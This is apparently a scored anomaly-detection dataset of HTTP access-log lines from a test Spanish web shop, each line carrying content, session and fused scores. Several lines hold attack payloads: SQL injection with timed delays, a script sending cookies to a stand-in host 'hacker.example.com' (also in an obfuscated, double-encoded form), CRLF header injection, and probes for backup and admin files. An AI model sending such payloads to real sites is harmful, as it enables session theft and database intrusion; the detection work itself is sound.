score_content,score_session,score_fused,score_fused_norm,line
87.1322021484375,0.5533984303474426,43.84280028939247,43.84280028939247,localhost:8080 - - [10/Jan/2025:15:30:11 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mirabell&password=implIcaNte&nombre=Yayn&apellidos=Boliart+Jubert&email=karlatos-woodcroft%40joyaseleccion.fr&dni=321B59898X&direccion=Avenida+Vigo+194+&ciudad=Olula+de+Castro&cp=07195&provincia=Cuenca&ntc=6879168763922210&B1=Registrar HTTP/1.1 HTTP/1.1" 200 945 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1999216079711914,0.552814781665802,1.8763681948184967,1.8763681948184967,localhost:8080 - - [10/Jan/2025:15:30:11 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.989051818847656,0.5586311221122742,14.773841470479965,14.773841470479965,localhost:8080 - - [10/Jan/2025:15:30:11 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1 HTTP/1.1" 200 375 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.5583347082138062,1.8465916514396667,1.8465916514396667,localhost:8080 - - [10/Jan/2025:15:30:12 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.863435745239258,0.5591775178909302,12.211306631565094,12.211306631565094,localhost:8080 - - [10/Jan/2025:15:30:12 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.577316403388977,1.8560824990272522,1.8560824990272522,localhost:8080 - - [10/Jan/2025:15:30:12 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3091105222702026,0.577669620513916,0.9433900713920593,0.9433900713920593,localhost:8080 - - [10/Jan/2025:15:30:12 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide.gif/ HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.9607197046279907,0.5430479049682617,0.7518838047981262,0.7518838047981262,localhost:8080 - - [10/Jan/2025:15:30:13 +0000] "GET http://localhost:8080/tienda1/global/4861362529278789730.java HTTP/1.1 HTTP/1.1" 200 210 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
37.487918853759766,0.5596729516983032,19.023795902729034,19.023795902729034,localhost:8080 - - [10/Jan/2025:15:30:13 +0000] "GET http://localhost:8080http://localhost:9090/examplesWebApp/OrderParser.jsp?xmlfile=C:/bea/weblogic81/samples/server/examples/src/examples/xml/orderParser/order.xml HTTP/1.1 HTTP/1.1" 200 513 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.4809591472148895,0.5344680547714233,0.5077136009931564,0.5077136009931564,localhost:8080 - - [10/Jan/2025:15:30:13 +0000] "GET http://localhost:8080/samples/sampsite/catalog.htm HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.6460857391357422,0.5177186727523804,1.0819022059440613,1.0819022059440613,localhost:8080 - - [10/Jan/2025:15:30:13 +0000] "GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 243 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5913670063018799,0.49962252378463745,0.5454947650432587,0.5454947650432587,localhost:8080 - - [10/Jan/2025:15:30:14 +0000] "GET http://localhost:8080/tienda1/miembros/index.jsp/.Inc HTTP/1.1 HTTP/1.1" 200 186 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
96.2890853881836,0.6017953753471375,48.445440381765366,48.445440381765366,localhost:8080 - - [10/Jan/2025:15:30:14 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sena&password=Mata_3OLvO&nombre=Rut&apellidos=Valiente+Mu%F1umer&email=lanyon_guerrasio%40automovilesalhambra.um&dni=97238430L&direccion=Calle+Granada%2C+85+&ciudad=Monistrol+de+Calders&cp=10140&provincia=.Guad%2Bala.jara&ntc=9959544300389605&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1665313243865967,0.6185356974601746,1.8925335109233856,1.8925335109233856,localhost:8080 - - [10/Jan/2025:15:30:14 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
91.87588500976562,0.7280376553535461,46.301961332559586,46.301961332559586,localhost:8080 - - [10/Jan/2025:15:30:14 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=sena&password=Mata_3OLvO&nombre=Rut&apellidos=Valiente+Mu%F1umer&email=lanyon_guerrasio%40automovilesalhambra.um&dni=97238430L&direccion=Calle+Granada%2C+85+&ciudad=Monistrol+de+Calders&cp=10140&provincia=Le%F3n&ntc=9959544300389605&B1=Registrar HTTP/1.1 HTTP/1.1" 200 975 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1665313243865967,0.746361255645752,1.9564462900161743,1.9564462900161743,localhost:8080 - - [10/Jan/2025:15:30:15 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.7613602876663208,0.8509354591369629,1.3061478734016418,1.3061478734016418,localhost:8080 - - [10/Jan/2025:15:30:15 +0000] "GET http://localhost:8080/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 132 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.86310875415802,0.9554507732391357,1.4092797636985779,1.4092797636985779,localhost:8080 - - [10/Jan/2025:15:30:15 +0000] "GET http://localhost:8080/servlet/SnoopServlet HTTP/1.1 HTTP/1.1" 200 153 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.15384210646152496,0.8138172626495361,0.48382968455553055,0.48382968455553055,localhost:8080 - - [10/Jan/2025:15:30:15 +0000] "GET http://localhost:8080/.jsp HTTP/1.1 HTTP/1.1" 200 105 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.3310946226119995,0.7994058728218079,0.5652502477169037,0.5652502477169037,localhost:8080 - - [10/Jan/2025:15:30:16 +0000] "GET http://localhost:8080/6909030637832563290.jsp HTTP/1.1 HTTP/1.1" 200 162 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.9607197046279907,0.6913622617721558,0.8260409832000732,0.8260409832000732,localhost:8080 - - [10/Jan/2025:15:30:16 +0000] "GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg.java HTTP/1.1 HTTP/1.1" 200 210 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
362.8507080078125,1.1916747093200684,182.02119135856628,182.02119135856628,localhost:8080 - - [10/Jan/2025:15:30:16 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidad=57&B1=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F HTTP/1.1 HTTP/1.1" 200 2022 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,1.1863903999328613,2.1606194972991943,2.1606194972991943,localhost:8080 - - [10/Jan/2025:15:30:16 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
30.052244186401367,1.1928690671920776,15.622556626796722,15.622556626796722,localhost:8080 - - [10/Jan/2025:15:30:17 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39%2F&cantidad=57&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,1.192261815071106,2.1635552048683167,2.1635552048683167,localhost:8080 - - [10/Jan/2025:15:30:17 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.740039825439453,1.198207139968872,15.469123482704163,15.469123482704163,localhost:8080 - - [10/Jan/2025:15:30:17 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Queso+Manchego&precio=85&cantidad=57&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,1.216008186340332,2.1754283905029297,2.1754283905029297,localhost:8080 - - [10/Jan/2025:15:30:17 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
73.49639129638672,1.302623987197876,37.3995076417923,37.3995076417923,localhost:8080 - - [10/Jan/2025:15:30:18 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kolahi45&pwd=pr0to&remember=on&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1 HTTP/1.1" 200 852 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.2718217372894287,1.2848213911056519,2.2783215641975403,2.2783215641975403,localhost:8080 - - [10/Jan/2025:15:30:18 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
30.371191024780273,1.3081445693969727,15.839667797088623,15.839667797088623,localhost:8080 - - [10/Jan/2025:15:30:18 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kolahi45&pwd=69%27c48Ng%2C7%2C7A&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 402 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.2718217372894287,1.3259421586990356,2.298881947994232,2.298881947994232,localhost:8080 - - [10/Jan/2025:15:30:18 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.418622970581055,1.3478257656097412,14.883224368095398,14.883224368095398,localhost:8080 - - [10/Jan/2025:15:30:19 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=kolahi45&pwd=pr0to&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 363 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.2718217372894287,1.2434779405593872,2.257649838924408,2.257649838924408,localhost:8080 - - [10/Jan/2025:15:30:19 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.624387741088867,1.2444602251052856,12.434423983097076,12.434423983097076,localhost:8080 - - [10/Jan/2025:15:30:19 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.4813954830169678,1.1461992263793945,2.313797354698181,2.313797354698181,localhost:8080 - - [10/Jan/2025:15:30:19 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.9607197046279907,1.1302900314331055,1.045504868030548,1.045504868030548,localhost:8080 - - [10/Jan/2025:15:30:20 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp.BAK HTTP/1.1 HTTP/1.1" 200 210 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.16190901398658752,1.0146948099136353,0.5883019119501114,0.5883019119501114,localhost:8080 - - [10/Jan/2025:15:30:20 +0000] "GET http://localhost:8080.inc HTTP/1.1 HTTP/1.1" 200 102 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.465343475341797,0.9108517169952393,13.188097596168518,13.188097596168518,localhost:8080 - - [10/Jan/2025:15:30:20 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%2520 HTTP/1.1 HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.9229443669319153,2.0288964807987213,2.0288964807987213,localhost:8080 - - [10/Jan/2025:15:30:20 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.09080696105957,0.9401741623878479,13.015490561723709,13.015490561723709,localhost:8080 - - [10/Jan/2025:15:30:21 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.9595311880111694,2.0471898913383484,2.0471898913383484,localhost:8080 - - [10/Jan/2025:15:30:21 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2077752649784088,0.4410551190376282,0.3244151920080185,0.3244151920080185,localhost:8080 - - [10/Jan/2025:15:30:21 +0000] "GET http://localhost:8080/asf-logo-wide.gif HTTP/1.1 HTTP/1.1" 200 144 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
35.33695983886719,0.4545874297618866,17.895773634314537,17.895773634314537,localhost:8080 - - [10/Jan/2025:15:30:21 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&precio=7931&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 483 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.104874610900879,0.4485054314136505,1.7766900211572647,1.7766900211572647,localhost:8080 - - [10/Jan/2025:15:30:22 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
26.18586540222168,0.4505763053894043,13.318220853805542,13.318220853805542,localhost:8080 - - [10/Jan/2025:15:30:22 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7931&B1=Pasar+por+caja%2F HTTP/1.1 HTTP/1.1" 200 309 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.104874610900879,0.4448988735675812,1.77488674223423,1.77488674223423,localhost:8080 - - [10/Jan/2025:15:30:22 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.465343475341797,0.44637927412986755,12.955861374735832,12.955861374735832,localhost:8080 - - [10/Jan/2025:15:30:22 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=7931&B1=Confirmar HTTP/1.1 HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.104874610900879,0.3764444589614868,1.7406595349311829,1.7406595349311829,localhost:8080 - - [10/Jan/2025:15:30:23 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.1464250534772873,0.3644832372665405,0.2554541453719139,0.2554541453719139,localhost:8080 - - [10/Jan/2025:15:30:23 +0000] "GET http://localhost:8080/tienda1.inc HTTP/1.1 HTTP/1.1" 200 126 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
108.72409057617188,0.47669968008995056,54.60039512813091,54.60039512813091,localhost:8080 - - [10/Jan/2025:15:30:23 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winsberg&password=flagicio&nombre=Lihuel&apellidos=Novell+Abenoza&email=hasserman%40clinicadentalsansalvador.ua&dni=95659491F&direccion=Federico+Garcia+Lorca%2C+132%2C+&ciudad=Riudoms&cp=36960&provincia=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=1343774789684603&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1074 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1999216079711914,0.47839123010635376,1.8391564190387726,1.8391564190387726,localhost:8080 - - [10/Jan/2025:15:30:23 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
84.36678314208984,0.5576651096343994,42.46222412586212,42.46222412586212,localhost:8080 - - [10/Jan/2025:15:30:24 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winsberg&password=flagicio&nombre=Lihuel&apellidos=Novell+Abenoza&email=hasserman%40clinicadentalsansalvador.ua&dni=95659491F&direccion=*Vila-nova%2C+139+&ciudad=Riudoms&cp=36960&provincia=Burgos&ntc=1343774789684603&B1=Registrar HTTP/1.1 HTTP/1.1" 200 927 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1999216079711914,0.5589156746864319,1.8794186413288116,1.8794186413288116,localhost:8080 - - [10/Jan/2025:15:30:24 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
91.39393615722656,0.6527834534645081,46.023359805345535,46.023359805345535,localhost:8080 - - [10/Jan/2025:15:30:24 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winsberg&password=flagicio&nombre=Lihuel&apellidos=Novell+Abenoza&email=hasserman%40clinicadentalsansalvador.ua&dni=95659491F&direccion=Federico+Garcia+Lorca%2C+132%2C+&ciudad=Riudoms&cpA=36960&provincia=Burgos&ntc=1343774789684603&B1=Registrar HTTP/1.1 HTTP/1.1" 200 972 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1999216079711914,0.6540347933769226,1.926978200674057,1.926978200674057,localhost:8080 - - [10/Jan/2025:15:30:24 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.3638291358947754,0.7739153504371643,1.5688722431659698,1.5688722431659698,localhost:8080 - - [10/Jan/2025:15:30:25 +0000] "GET http://localhost:8080/tienda1/publico/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2831253707408905,0.7690944075584412,0.5261098891496658,0.5261098891496658,localhost:8080 - - [10/Jan/2025:15:30:25 +0000] "GET http://localhost:8080/asf-logo-wide.gif.Bak HTTP/1.1 HTTP/1.1" 200 156 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.863435745239258,0.7671668529510498,12.315301299095154,12.315301299095154,localhost:8080 - - [10/Jan/2025:15:30:25 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1348485946655273,0.7679979205131531,1.9514232575893402,1.9514232575893402,localhost:8080 - - [10/Jan/2025:15:30:25 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.858176052570343,0.749498724937439,0.803837388753891,0.803837388753891,localhost:8080 - - [10/Jan/2025:15:30:26 +0000] "GET http://localhost:8080/tienda1/publico/asf-logo-wide.gif.inc HTTP/1.1 HTTP/1.1" 200 204 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.22403545677661896,0.7351015210151672,0.4795684888958931,0.4795684888958931,localhost:8080 - - [10/Jan/2025:15:30:26 +0000] "GET http://localhost:8080/iisadmpwd/achg.htr HTTP/1.1 HTTP/1.1" 200 147 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5528591275215149,0.7341014742851257,0.6434803009033203,0.6434803009033203,localhost:8080 - - [10/Jan/2025:15:30:26 +0000] "GET http://localhost:8080/tienda1/miembros/index.jsp.inc HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
75.16496276855469,0.7906577587127686,37.97781026363373,37.97781026363373,localhost:8080 - - [10/Jan/2025:15:30:26 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=maupin&password=pu552lmen34&nombre=Ta%EDs&apellidos=Yepes+Vall&email=sova%40tarifasdevuelos.ml&dni=74740920M&direccion=Lanzarote%2C+37+&ciudad=Cat%ED&cp=2631A&provincia=Zamora&ntc=3946035396869059&B1=Registrar HTTP/1.1 HTTP/1.1" 200 864 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.1665313243865967,0.791461169719696,1.9789962470531464,1.9789962470531464,localhost:8080 - - [10/Jan/2025:15:30:27 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
